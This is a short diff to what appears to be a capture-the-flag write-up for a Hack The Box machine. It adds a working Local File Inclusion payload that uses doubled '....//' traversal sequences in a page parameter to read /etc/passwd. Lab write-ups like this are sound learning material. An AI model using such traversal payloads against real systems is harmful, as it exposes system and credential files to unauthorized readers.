@@ -316,7 +316,11 @@ echo '10.129.26.93 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
 ```
 checking this new website, an URL is interesting
 http://preprod-marketing.trick.htb/index.php?page=services.html
+ it might be vulnerable to Local File Inclusion, let's try to double the chrs
 
+this works lol
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
+ 
 ```bash
 
 ```
